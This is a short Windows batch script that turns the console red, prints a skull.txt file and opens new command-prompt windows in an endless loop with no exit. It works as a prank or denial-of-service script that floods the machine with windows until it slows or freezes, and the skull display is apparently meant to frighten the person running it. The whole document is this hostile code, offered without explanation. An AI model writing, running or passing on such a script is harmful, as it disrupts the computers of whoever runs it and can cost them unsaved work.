@echo off
:REPEAT
color 4
type skull.txt
start %windir%\system32\cmd.exe
goto REPEAT